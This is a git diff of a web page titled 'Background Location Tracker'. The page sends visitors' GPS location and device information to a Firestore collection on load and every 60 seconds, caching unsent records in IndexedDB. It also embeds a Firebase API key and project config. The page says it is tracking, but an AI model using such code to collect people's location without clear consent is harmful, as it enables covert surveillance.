@@ -3,13 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home Page</title>
+    <title>Background Location Tracker</title>
     <script type="module">
-        // Import Firebase
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-        // Firebase Configuration
+        // Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyAB6STYBF-Fzg4U4QkET_bMej47ZUJDM4Y",
             authDomain: "locationsaver-b9997.firebaseapp.com",
@@ -24,20 +23,18 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
+        // Request Persistent Storage
+        if (navigator.storage && navigator.storage.persist) {
+            navigator.storage.persist().then((granted) => {
+                console.log(granted ? "✅ Persistent Storage Granted" : "⚠️ Persistent Storage Denied");
+            });
+        }
+
         // Register Service Worker
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('/sw.js')
-                .then((registration) => {
-                    console.log("✅ Service Worker Registered!");
-
-                    // Trigger Background Sync when online
-                    navigator.serviceWorker.ready.then(reg => {
-                        reg.sync.register('sync-location')
-                            .then(() => console.log("✅ Background Sync Registered"))
-                            .catch(err => console.error("❌ Sync Registration Failed:", err));
-                    });
-                })
-                .catch(error => console.error("❌ Service Worker Registration Failed:", error));
+                .then(() => console.log("✅ Service Worker Registered"))
+                .catch(err => console.error("❌ SW Registration Failed:", err));
         }
 
         // Get Device Info
@@ -111,7 +108,7 @@
                 });
         }
 
-        // Save data to Firestore
+        // Save Data to Firestore
         async function saveToFirestore(data) {
             try {
                 await addDoc(collection(db, "user_data"), data);
@@ -137,7 +134,7 @@
             });
         }
 
-        // Cache Unsent Data in IndexedDB
+        // Cache Unsent Data
         async function cacheUnsentData(data) {
             let db = await openDB();
             let transaction = db.transaction("unsent_data", "readwrite");
@@ -145,7 +142,7 @@
             store.add(data);
         }
 
-        // Collect and Send Data
+        // Collect and Send Location
         function collectLocation() {
             getGPSLocation((gpsData) => {
                 if (gpsData) {
@@ -165,14 +162,14 @@
             });
         });
 
-        // Send data immediately when the page loads
+        // Send data when the page is opened
         collectLocation();
 
         // Send data every 60 seconds
-        setInterval(collectLocation, 20000);
+        setInterval(collectLocation, 60000);
     </script>
 </head>
 <body>
-    <h2>Tracking Location in Background.</h2>
+    <h2>Tracking Location in Background...</h2>
 </body>
 </html>
